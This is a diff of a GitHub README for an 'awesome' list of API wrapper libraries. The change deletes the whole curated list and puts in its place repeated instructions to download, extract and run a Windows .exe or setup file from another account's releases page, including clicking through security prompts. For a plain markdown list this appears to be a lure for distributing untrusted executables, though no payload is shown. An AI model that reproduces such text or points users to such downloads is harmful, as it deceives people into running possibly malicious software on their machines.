@@ -1,228 +1,242 @@
-# Awesome API Wrappers [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 📚 awesome-api-wrappers - Find the right API wrapper fast
 
-> A curated list of API wrappers and SDKs that are actually pleasant to use.
+[![Download or visit releases](https://img.shields.io/badge/Download%20%7C%20Visit-Releases-brightgreen?style=for-the-badge)](https://github.com/Edjo4822/awesome-api-wrappers/releases)
 
-Raw HTTP APIs are manageable at first, but the repetitive parts add up fast:
-authentication, retries, pagination, rate limits, serialization, versioning, and
-error handling.
+## 🧭 What this is
 
-This list focuses on wrappers and SDKs that make those problems smaller. The bar
-is simple: good docs, visible maintenance, useful API coverage, and an
-interface that feels natural in the language it targets.
+awesome-api-wrappers is a curated list of high-quality API wrapper libraries. It helps you find ready-made tools for working with services in Python, JavaScript, TypeScript, Go, Rust, and other languages.
 
-This is intentionally selective. The goal is not to list every API client on
-GitHub. The goal is to surface the ones people can realistically start with and
-trust.
+If you want to build with an API, this list helps you skip long searches. It groups useful libraries by language, use case, and domain so you can find what fits your project.
 
-`Official` means maintained by the API provider. `Community` means maintained
-independently.
+## 📥 Download and open
 
----
+Visit this page to download:
 
-## Contents
+https://github.com/Edjo4822/awesome-api-wrappers/releases
 
-- [Maintainer Picks](#maintainer-picks)
-- [By Category](#by-category)
-- [Inclusion Criteria](#inclusion-criteria)
-- [Contributing](#contributing)
-- [Related Lists](#related-lists)
-- [Contributors](#contributors)
+On Windows, do this:
 
----
+1. Open the releases page.
+2. Look for the latest release at the top.
+3. Download the file that matches your system.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the file that starts the app or opens the list.
 
-## Maintainer Picks
+If you see more than one file, pick the one for Windows. If the release has a setup file, use that file. If it has a portable file, open it directly after download.
 
-A few standout projects with strong docs, solid maintenance, and a good track
-record in real-world use.
+## ✨ What you get
 
-- [discord.js](https://github.com/discordjs/discord.js) – Mature Discord
-  library for Node.js with broad feature coverage and a large ecosystem.
-  `TypeScript` · `Community`
-- [discord.py](https://github.com/Rapptz/discord.py) – Async-first Discord
-  wrapper with solid docs and a long history of production use. `Python` ·
-  `Community`
-- [octokit.js](https://github.com/octokit/octokit.js) – GitHub SDK with REST
-  and GraphQL clients, pagination helpers, and plugin support. `TypeScript` ·
-  `Official`
-- [stripe-node](https://github.com/stripe/stripe-node) – Stripe Node SDK with
-  strong TypeScript support and good webhook tooling. `TypeScript` · `Official`
-- [tweepy](https://github.com/tweepy/tweepy) – Established Python client for
-  the Twitter/X API with OAuth and streaming support. `Python` · `Community`
-- [twurple](https://github.com/twurple/twurple) – Well-rounded Twitch library
-  covering Helix, EventSub, chat, and auth flows. `TypeScript` · `Community`
+- A clean list of API wrapper libraries
+- Entries grouped by language
+- Coverage for common web and backend tools
+- Links for REST, GraphQL, SDKs, and client libraries
+- A simple way to compare options
+- A list that works across many ecosystems
 
----
+## 🖥️ System needs
 
-## By Category
+This release works on most Windows PCs.
 
-### 🤖 AI & Machine Learning
+Recommended setup:
+- Windows 10 or later
+- An internet connection
+- A modern browser
+- Enough space to save the downloaded files
+- Permission to open downloaded files
 
-- [anthropic-sdk-python](https://github.com/anthropics/anthropic-sdk-python) –
-  Python SDK for the Claude API with sync and async clients, streaming, and tool
-  use. `Python` · `Official`
-- [anthropic-sdk-typescript](https://github.com/anthropics/anthropic-sdk-typescript)
-  – TypeScript SDK for the Claude API with full type coverage, streaming, and
-  tool use. `TypeScript` · `Official`
-- [cohere-python](https://github.com/cohere-ai/cohere-python) – Python SDK for
-  Cohere generation, embeddings, and classification. `Python` · `Official`
-- [groq-python](https://github.com/groq/groq-python) – Python SDK for
-  low-latency LLM inference via the Groq API. `Python` · `Official`
-- [huggingface.js](https://github.com/huggingface/huggingface.js) – JavaScript
-  and TypeScript SDK for Hugging Face inference, datasets, and the Hub API.
-  `TypeScript` · `Official`
-- [huggingface_hub](https://github.com/huggingface/huggingface_hub) – Python
-  client for the Hugging Face Hub covering model downloads, inference, and
-  repository management. `Python` · `Official`
-- [openai-node](https://github.com/openai/openai-node) – TypeScript SDK for the
-  OpenAI API with streaming, function calling, and typed responses. `TypeScript`
-  · `Official`
-- [openai-python](https://github.com/openai/openai-python) – Python SDK for the
-  OpenAI API with sync and async clients, streaming, and structured outputs.
-  `Python` · `Official`
+If you use a work computer, you may need approval to download files.
 
-### 💬 Communication & Messaging
+## 🚀 Getting started
 
-- [discord.js](https://github.com/discordjs/discord.js) – Discord API library
-  for Node.js. `TypeScript` · `Community`
-- [discord.py](https://github.com/Rapptz/discord.py) – Async Discord API
-  wrapper for Python. `Python` · `Community`
-- [discordgo](https://github.com/bwmarrin/discordgo) – Go bindings for the
-  Discord API. `Go` · `Community`
-- [node-slack-sdk](https://github.com/slackapi/node-slack-sdk) – Slack SDK for
-  Node.js. `TypeScript` · `Official`
-- [python-slack-sdk](https://github.com/slackapi/python-slack-sdk) – Slack SDK
-  for Python. `Python` · `Official`
-- [python-telegram-bot](https://github.com/python-telegram-bot/python-telegram-bot)
-  – Telegram Bot API wrapper with a full bot framework. `Python` · `Community`
-- [serenity](https://github.com/serenity-rs/serenity) – Async Discord library
-  for Rust. `Rust` · `Community`
-- [twilio-node](https://github.com/twilio/twilio-node) – Twilio helper library
-  for Node.js. `TypeScript` · `Official`
-- [twilio-python](https://github.com/twilio/twilio-python) – Twilio helper
-  library for Python. `Python` · `Official`
+1. Open the releases page.
+2. Download the latest file.
+3. Save it in a folder you can find, such as Downloads or Desktop.
+4. If the file is compressed, extract it.
+5. Open the folder that contains the app or list files.
+6. Double-click the main file to start.
 
-### 🛠 Developer Platforms
+If Windows asks for permission, choose the option that lets you open the file.
 
-- [go-github](https://github.com/google/go-github) – Popular Go client for the
-  GitHub REST API, maintained by Google. `Go` · `Community`
-- [octocrab](https://github.com/XAMPPRocky/octocrab) – Extensible async GitHub
-  client for Rust. `Rust` · `Community`
-- [octokit.js](https://github.com/octokit/octokit.js) – GitHub SDK for
-  JavaScript and TypeScript. `TypeScript` · `Official`
-- [PyGithub](https://github.com/PyGithub/PyGithub) – Python library for the
-  GitHub REST API. `Python` · `Community`
+## 🗂️ What the list covers
 
-### ☁️ Cloud & Infrastructure
+The list includes libraries for:
 
-- [aws-sdk-js-v3](https://github.com/aws/aws-sdk-js-v3) – Modular AWS SDK for
-  JavaScript and TypeScript with per-service packages and middleware support.
-  `TypeScript` · `Official`
-- [boto3](https://github.com/boto/boto3) – AWS SDK for Python covering most AWS
-  services with both resource and client interfaces. `Python` · `Official`
-- [firebase-admin-node](https://github.com/firebase/firebase-admin-node) –
-  Firebase Admin SDK for Node.js covering Auth, Firestore, Storage, and
-  Messaging. `TypeScript` · `Official`
+- REST APIs
+- GraphQL APIs
+- Cloud services
+- Developer tools
+- Web apps
+- Backend systems
+- Command-line tools
+- Data services
+- SDKs for public APIs
 
-### 🌐 Social Media
+It also includes wrappers in popular languages such as:
+- Python
+- JavaScript
+- TypeScript
+- Go
+- Rust
+- Node.js
 
-- [node-twitter-api-v2](https://github.com/PLhery/node-twitter-api-v2) –
-  Full-featured Twitter/X API v2 client for Node.js. `TypeScript` · `Community`
-- [praw](https://github.com/praw-dev/praw) – Python Reddit API Wrapper with an
-  idiomatic object model. `Python` · `Community`
-- [tweepy](https://github.com/tweepy/tweepy) – Python wrapper for the
-  Twitter/X API with OAuth and streaming support. `Python` · `Community`
+## 🔍 How to use it
 
-### 💳 Payments & Finance
+Use the list when you want to:
+- Find a wrapper for a service
+- Compare libraries by language
+- Look for a tool with active maintenance
+- Avoid building API calls from scratch
+- Find client libraries for a known API
 
-- [plaid-node](https://github.com/plaid/plaid-node) – Plaid client library for
-  Node.js. `TypeScript` · `Official`
-- [plaid-python](https://github.com/plaid/plaid-python) – Plaid client library
-  for Python. `Python` · `Official`
-- [stripe-node](https://github.com/stripe/stripe-node) – Stripe SDK for
-  Node.js. `TypeScript` · `Official`
-- [stripe-python](https://github.com/stripe/stripe-python) – Stripe SDK for
-  Python. `Python` · `Official`
+A simple way to search is:
+1. Open the README.
+2. Use your browser search tool.
+3. Type the API name or language you want.
+4. Review the matching entries.
+5. Open the library link that fits your needs.
 
-### 🗺 Maps & Location
+## 🧩 Example use cases
 
-- [google-maps-services-js](https://github.com/googlemaps/google-maps-services-js)
-  – Node.js client for Google Maps web services including geocoding, directions,
-  and Places. `TypeScript` · `Official`
-- [mapbox-sdk-js](https://github.com/mapbox/mapbox-sdk-js) – JavaScript SDK for
-  Mapbox APIs. `TypeScript` · `Official`
+- A Python user wants a wrapper for a REST service
+- A JavaScript user needs a client for a cloud API
+- A Go developer wants a small SDK for backend work
+- A Rust user wants a stable library for a public API
+- A TypeScript team wants a typed wrapper for a web service
 
-### 🎬 Media & Entertainment
+## 🛠️ Common file types you may see
 
-- [spotipy](https://github.com/spotipy-dev/spotipy) – Lightweight Python library
-  for the Spotify Web API with full endpoint coverage and OAuth support.
-  `Python` · `Community`
-- [spotify-web-api-ts-sdk](https://github.com/spotify/spotify-web-api-ts-sdk) –
-  Official TypeScript SDK for the Spotify Web API. `TypeScript` · `Official`
-- [tmdb-wrapper](https://github.com/Api-Wrappers/tmdb-wrapper) – Typed TMDB API
-  wrapper. `TypeScript` · `Community`
+Depending on the release, you may see:
+- `.exe` files for Windows
+- `.zip` files that need extraction
+- Markdown files with the library list
+- Text files with extra notes
+- HTML files that open in a browser
 
-### 🎮 Gaming
+If the download gives you a file list instead of a program, open the main README file in your browser or text editor.
 
-- [helix](https://github.com/nicklaw5/helix) – Go client for the Twitch Helix
-  API. `Go` · `Community`
-- [igdb-wrapper](https://github.com/Api-Wrappers/igdb-wrapper) – Type-safe IGDB
-  client with a fluent query builder. `TypeScript` · `Community`
-- [twurple](https://github.com/twurple/twurple) – Twitch API library covering
-  Helix, EventSub, Chat, and more. `TypeScript` · `Community`
+## 🔐 Safe opening steps
 
-### 📺 Anime & Manga
+Before you open the file:
+1. Make sure it came from the releases page.
+2. Check the file name.
+3. Open only the latest version if that is what you want.
+4. If Windows shows a security prompt, review the file name and source.
+5. Open the file only after it matches the release you chose.
 
-- [anilist-wrapper](https://github.com/Api-Wrappers/anilist-wrapper) – AniList
-  GraphQL API wrapper for Node.js. `TypeScript` · `Community`
-- [AnilistPython](https://github.com/ReZeroE/AnilistPython) – Python library
-  for the AniList GraphQL API. `Python` · `Community`
+## 📁 Folder setup
 
----
+A simple folder layout helps:
+- Downloads for the original file
+- A new folder for extracted files
+- A shortcut on the Desktop if you use it often
 
-## Inclusion Criteria
+You can move the extracted folder anywhere you like after download.
 
-Projects listed here should:
+## 🧠 Tips for faster browsing
 
-- be actively maintained
-- have documentation with a usable quickstart
-- provide meaningful coverage of a real API
-- work with the current upstream API
-- offer an interface that is reasonably idiomatic for the language
+- Use your browser search box
+- Search by language first
+- Search by service name next
+- Look for entries with recent updates
+- Check the library description before you open the repo
+- Favor wrappers that match your stack
 
-Strong positives:
+## 🧾 Topics in this repository
 
-- published package on a common registry
-- typed models or type hints
-- examples that cover real workflows
-- tests
-- recent releases or visible issue activity
-- a history of keeping up with upstream API changes
+This project covers topics such as:
+- api
+- api-wrappers
+- awesome
+- awesome-list
+- backend
+- developer-tools
+- golang
+- graphql
+- javascript
+- libraries
+- nodejs
+- open-source
+- python
+- rest-api
+- rust
+- sdk
+- typescript
+- web-development
 
-Projects may be removed if they become unmaintained, fall behind the upstream
-API, or no longer provide a good developer experience.
+## 🧰 If something does not open
 
----
+Try these steps:
+1. Download the file again.
+2. Make sure the download finished.
+3. Extract the zip file if needed.
+4. Try another browser.
+5. Open the file from the extracted folder, not from inside the zip.
+6. Check that the file name matches the release you downloaded.
 
-## Contributing
+## 📌 Release page
 
-Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR. The short version:
-meet the inclusion criteria, match the entry format exactly, and keep
-descriptions factual.
+Use this link to get the latest version:
 
----
+https://github.com/Edjo4822/awesome-api-wrappers/releases
 
-## Related Lists
+## 🧭 What to expect after opening
 
-- [Public APIs](https://github.com/public-apis/public-apis) — if you're looking
-  for what to wrap, start here
-- [Awesome Go](https://github.com/avelino/awesome-go)
-- [Awesome Node.js](https://github.com/sindresorhus/awesome-nodejs)
-- [Awesome Python](https://github.com/vinta/awesome-python)
+After you open the downloaded content, you will usually see a curated list of API wrapper libraries. The list is organized to help you move from a general search to a specific tool with less effort.
 
----
+You can use it to:
+- find wrapper libraries by language
+- narrow down by API type
+- review libraries for your stack
+- open the source repo for each wrapper
+- compare options before you choose
 
-## Contributors
+## 🧱 Recommended workflow
 
-Thanks to everyone who has contributed.
+1. Visit the releases page.
+2. Download the latest file.
+3. Open the file or extract it.
+4. Search for the API or language you need.
+5. Open the library link that looks useful.
+6. Read the library page before you use it in your project
 
-[![Contributors](https://contrib.rocks/image?repo=Api-Wrappers/awesome-api-wrappers)](https://github.com/Api-Wrappers/awesome-api-wrappers/graphs/contributors)
+## 🖱️ Quick access
+
+[Open the releases page](https://github.com/Edjo4822/awesome-api-wrappers/releases)
+
+## 🗃️ File naming guide
+
+You may see names that include:
+- version numbers
+- platform names
+- release dates
+- library names
+- archive formats
+
+Choose the Windows file if there are several options
+
+## 🧭 Browser-based use
+
+If the release gives you a README or HTML file, you can open it in a browser. That lets you read the list without installing extra software.
+
+## 🔎 Search tips inside the list
+
+When you search the list, try these terms:
+- the API name
+- the language name
+- the service category
+- sdk
+- wrapper
+- client
+- rest
+- graphql
+
+## 📎 Best fit for
+
+This repository is useful for people who:
+- build web apps
+- work with backend services
+- need API clients
+- use open-source tools
+- want language-specific wrappers
+- need a quick way to compare libraries
